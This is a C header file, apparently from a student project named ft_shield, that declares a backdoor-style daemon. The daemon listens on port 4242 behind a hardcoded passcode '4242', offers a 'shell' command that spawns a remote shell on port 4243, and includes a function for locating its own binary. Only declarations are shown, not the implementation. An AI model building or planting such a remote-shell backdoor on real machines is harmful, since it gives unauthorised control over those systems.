#ifndef FT_SHIELD_H
# define FT_SHIELD_H

# include <fcntl.h>
# include <libgen.h>
# include <limits.h>
# include <stdbool.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <errno.h>
# include <bsd/string.h>
# include <unistd.h>
# include <arpa/inet.h>
# include <sys/types.h>
# include <sys/socket.h>
# include <sys/select.h>
# include <sys/un.h>
# include <sys/wait.h>

#define DEST_PATH "/workspaces"
#define LISTENING_PORT 4242
#define MAX_CONECTIONS 10
#define MAX_NBR_CLIENTS 2
#define PASSCODE "4242"

#define TRIM_CHARS "\f\n\r\t\v "

#define HELP "\
---------------------------------\n\
?     - Shows help\n\
shell - Spawn shell in port 4243\n\
---------------------------------\n\
"
#define REMOTE_OPENED "New remote shell opened in port 4243\n"
#define MANY_CLIENTS "Connection denied, to many clients\n"
#define CLEAR_CODE "\033[H\033[2J"

typedef struct s_list t_list;

typedef enum e_status {
	HANDSHAKE,
	CONNECTED,
} t_status;

typedef struct s_client {
	int			fd;
	t_status	status;
	char		*shell_code;
}	t_client;

typedef struct s_server {
	int			fd;
	int			nbr_clients;
	t_list		*pids;
	t_client	clients[MAX_CONECTIONS];
}	t_server;


int		handle_input(t_server *server, int index, char *buffer);
void	handle_handshake(t_server *server, int index, char *input);
int		handle_commands(t_server *server, int index, char *input);


/* shell.c */
// void	*shell_function(void *data);
void	*shell_function(t_server *server, int index);


/* server.c */
void	create_server_socket(t_server *s);
void	ft_server(t_server *server);

int	find_own_path(char *buffer, size_t size_buffer);

/* utils/utils.c */
char	*ft_strtrim(char const *s1, char const *set);

/* utils/list.c */
typedef struct s_list
{
	void			*content;
	struct s_list	*next;
}	t_list;

t_list	*ft_lstnew(void *content);
t_list	*ft_lstlast(t_list *lst);
void	ft_lstadd_back(t_list **lst, t_list *new_node);
bool	shell_was_closed(t_list *node);
void	ft_delete_node_if_true(t_server *server, t_list **lst, bool (*f)(t_list *));
void	ft_lstdelone(t_list *lst, void (*del)(void *));
void	ft_lstclear(t_list **lst, void (*del)(void *));

#endif
